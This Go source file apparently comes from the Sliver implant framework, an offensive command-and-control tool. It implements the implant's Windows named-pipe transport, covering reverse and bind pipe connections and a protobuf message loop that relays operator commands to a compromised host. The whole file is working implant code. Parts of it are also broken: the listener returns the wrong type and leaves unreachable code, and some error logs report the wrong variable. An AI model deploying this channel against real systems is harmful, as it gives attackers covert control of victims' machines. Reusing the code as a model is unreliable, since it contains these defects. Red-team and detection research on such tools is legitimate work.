package transports

/*
	Sliver Implant Framework
	Copyright (C) 2019  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

// {{if .Config.NamePipec2Enabled}}

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"io"
	"net"
	"net/url"
	"strings"
	"sync"

	// {{if .Config.Debug}}
	"log"
	// {{end}}

	"github.com/bishopfox/sliver/protobuf/sliverpb"
	pb "github.com/bishopfox/sliver/protobuf/sliverpb"
	"github.com/bishopfox/sliver/sliver/3rdparty/winio"
	"github.com/golang/protobuf/proto"
)

const (
	readBufSizeNamedPipe  = 1024
	writeBufSizeNamedPipe = 1024
)

// namedPipeDial - Reverse Named Pipe implant transport (Windows only)
func namedPipeDial(uri *url.URL) (*Connection, error) {
	address := uri.String()
	address = strings.ReplaceAll(address, "namedpipe://", "")
	address = "\\\\" + strings.ReplaceAll(address, "/", "\\")
	// {{if .Config.Debug}}
	log.Print("Named pipe address: ", address)
	// {{end}}
	conn, err := winio.DialPipe(address, nil)
	if err != nil {
		return nil, err
	}

	// Set up RPC read/write loop over the named pipe.
	connection, err := handleNamePipeConnection(conn)
	if err != nil {
		return nil, fmt.Errorf("failed to connect over named pipe: %s", err.Error())
	}
	if connection == nil {
		return nil, errors.New("failed to connect over named pipe (unknown reason)")
	}

	return connection, nil
}

// namedPipeListen - Bind Named Pipe implant transport (Windows only)
func namedPipeListen(uri *url.URL) (*Connection, error) {

	address := uri.String()
	address = strings.ReplaceAll(address, "namedpipe://", "")
	address = "\\\\" + strings.ReplaceAll(address, "/", "\\")
	// {{if .Config.Debug}}
	log.Print("Named pipe listener address: ", address)
	// {{end}}

	ln, err := winio.ListenPipe("\\\\.\\pipe\\"+address, nil)
	// {{if .Config.Debug}}
	log.Printf("Listening on %s", "\\\\.\\pipe\\"+address)
	// {{end}}
	if err != nil {
		return nil, err
	}

	for {
		// Wait for only one server connection, and return after setting it up.
		conn, err := ln.Accept()
		if err != nil {
			return nil, err
		}
		return conn, nil

		// Set up RPC read/write loop over the named pipe.
		connection, err := handleNamePipeConnection(conn)
		if err != nil {
			return nil, fmt.Errorf("failed to connect over named pipe: %s", err.Error())
		}
		if connection == nil {
			return nil, errors.New("failed to connect over named pipe (unknown reason)")
		}

		return connection, nil
	}
}

func handleNamePipeConnection(conn net.Conn) (*Connection, error) {

	send := make(chan *pb.Envelope)
	recv := make(chan *pb.Envelope)
	ctrl := make(chan bool, 1)
	connection := &Connection{
		Send:    send,
		Recv:    recv,
		ctrl:    ctrl,
		tunnels: &map[uint64]*Tunnel{},
		mutex:   &sync.RWMutex{},
		once:    &sync.Once{},
		IsOpen:  true,
		cleanup: func() {
			// {{if .Config.Debug}}
			log.Printf("[namedpipe] lost connection, cleanup...")
			// {{end}}
			close(send)
			ctrl <- true
			close(recv)
		},
	}

	go func() {
		defer connection.Cleanup()
		for envelope := range send {
			// {{if .Config.Debug}}
			log.Printf("[namedpipe] send loop envelope type %d\n", envelope.Type)
			// {{end}}
			namedPipeWriteEnvelope(&conn, envelope)
		}
	}()

	go func() {
		defer connection.Cleanup()
		for {
			envelope, err := namedPipeReadEnvelope(&conn)
			if err == io.EOF {
				break
			}
			if err == nil {
				recv <- envelope
				// {{if .Config.Debug}}
				log.Printf("[namedpipe] Receive loop envelope type %d\n", envelope.Type)
				// {{end}}
			}
		}
	}()
	return connection, nil
}

func namedPipeWriteEnvelope(conn *net.Conn, envelope *sliverpb.Envelope) error {
	data, err := proto.Marshal(envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Print("[namedpipe] Marshaling error: ", err)
		// {{end}}
		return err
	}
	dataLengthBuf := new(bytes.Buffer)
	binary.Write(dataLengthBuf, binary.LittleEndian, uint32(len(data)))
	_, err = (*conn).Write(dataLengthBuf.Bytes())
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[namedpipe] Error %v and %d\n", err, dataLengthBuf)
		// {{end}}
	}
	totalWritten := 0
	for totalWritten < len(data)-writeBufSizeNamedPipe {
		n, err2 := (*conn).Write(data[totalWritten : totalWritten+writeBufSizeNamedPipe])
		totalWritten += n
		if err2 != nil {
			// {{if .Config.Debug}}
			log.Printf("[namedpipe] Error %v\n", err)
			// {{end}}
		}
	}
	if totalWritten < len(data) {
		missing := len(data) - totalWritten
		_, err := (*conn).Write(data[totalWritten : totalWritten+missing])
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("[namedpipe] Error %v\n", err)
			// {{end}}
		}
	}
	return nil
}

func namedPipeReadEnvelope(conn *net.Conn) (*sliverpb.Envelope, error) {
	dataLengthBuf := make([]byte, 4)
	_, err := (*conn).Read(dataLengthBuf)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[namedpipe] Error (read msg-length): %v\n", err)
		// {{end}}
		return nil, err
	}
	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
	readBuf := make([]byte, readBufSizeNamedPipe)
	dataBuf := make([]byte, 0)
	totalRead := 0
	for {
		n, err := (*conn).Read(readBuf)
		dataBuf = append(dataBuf, readBuf[:n]...)
		totalRead += n
		if totalRead == dataLength {
			break
		}
		if err != nil {
			// {{if .Config.Debug}}
			log.Printf("read error: %s\n", err)
			// {{end}}
			break
		}
	}
	envelope := &sliverpb.Envelope{}
	err = proto.Unmarshal(dataBuf, envelope)
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("[namedpipe] Unmarshaling envelope error: %v", err)
		// {{end}}
		return &sliverpb.Envelope{}, err
	}
	return envelope, nil
}

// {{end}} -NamePipec2Enabled
